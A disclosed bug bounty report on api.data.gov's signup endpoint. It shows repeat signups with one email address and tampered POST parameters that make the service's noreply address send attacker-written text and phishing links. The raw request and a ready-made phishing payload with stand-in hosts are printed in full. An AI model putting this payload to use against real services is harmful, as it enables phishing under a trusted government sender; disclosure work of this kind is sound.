# Multiple Bugs in api.data.gov/signup endpoint leads to send custom messages to Anyone

## Report Details
- **Report ID**: 360171
- **URL**: https://hackerone.com/reports/360171
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-05-31T11:13:09.807Z
- **Disclosed**: 2018-11-13T19:14:16.937Z

## Reporter
- **Username**: pressihackerone
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gsa_bbp

## Vulnerability Information
Hey there,

while signing for new api key, i have found two bugs that is unusual and make anyone to send crafted or customised email to someone.

Bug 1: - low 

1. Go to https://api.data.gov/signup/
2. Enter first and last name , then enter email id and get api key.

_Bug: You can use the same email id and signup endlessly._


Bug 2: - Medium/High

1. Go to https://api.data.gov/signup/
2. Enter first and last name , email and sigup
3. Now using Burp Suite Intercept the Proxy.The actual data in POST method looks like the following.


*POST /api-umbrella/v1/users.json?api_key=8Mndjk7k8ygsU4rM1lwBltMzet1FEAIuZeaqzEqV HTTP/1.1
Host: api.data.gov
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: application/json, text/javascript, */*; q=0.01
*Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://api.data.gov/signup/
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 497
DNT: 1
Connection: close*

*user%5Bfirst_name%5D=tester&user%5Blast_name%5D=moving&user%5Bemail%5D=testermoving%40gmail.com&user%5Buse_description%5D=&user%5Bterms_and_conditions%5D=1&user%5Bregistration_source%5D=web&options%5Bexample_api_url%5D=https%3A%2F%2Fdeveloper.nrel.gov%2Fapi%2Falt-fuel-stations%2Fv1%2Fnearest.json%3Fapi_key%3D%7B%7Bapi_key%7D%7D%26location%3DDenver%2BCO&options%5Bcontact_url%5D=https%3A%2F%2Fapi.data.gov%2Fcontact%2F&options%5Bsite_name%5D=&options%5Bsend_welcome_email%5D=true&options%5Bemail_from_name%5D=&options%5Bemail_from_address%5D=&options%5Bverify_email%5D=true*


4.Now change following parameters as per your choice and send misleading information and phising website from noreply@api.data.gov 

**user%5Bfirst_name%5D = Any sentence you want**
**options%5Bexample_api_url%5D = your phishing site**
**options%5Bcontact_url%5D = your contact URL**

Send the Request to the server and you will receive a crafted message and URL that leads anyone to visit unwanted website. 

**Example:**

Here is my payload that is used to send unintended website URLs and messages which not involved in YOUR DESING. *(you can use the same payload and receive crafted messages and url)*

user%5Bfirst_name%5D=This is from some governemt, Visit the follwing URL to register.&user%5Blast_name%5D=secondname&user%5Bemail%5D=testermoving%40gmail.com&user%5Buse_description%5D=&user%5Bterms_and_conditions%5D=1&user%5Bregistration_source%5D=web&options%5Bexample_api_url%5D=spoofed.websiteO&options%5Bcontact_url%5D=attackercontact.com&options%5Bsite_name%5D=&options%5Bsend_welcome_email%5D=true&options%5Bemail_from_name%5D=&options%5Bemail_from_address%5D=&options%5Bverify_email%5D=true

{F303584}

## Impact

Bug 1 impact:
Acquiring multiple API keys with same email id which is unusual.

Bug 2 impact:
Send Customised message.
Main problem here is, email is received from noreply@api.data.gov which is identified as authentic E-Mail.
Change the _**example URL**_ and make anyone to visit malicious website.
Change _**contact us**_ website.

## Attachments
- Screen_Shot_2018-05-31_at_4.19.51_PM.png
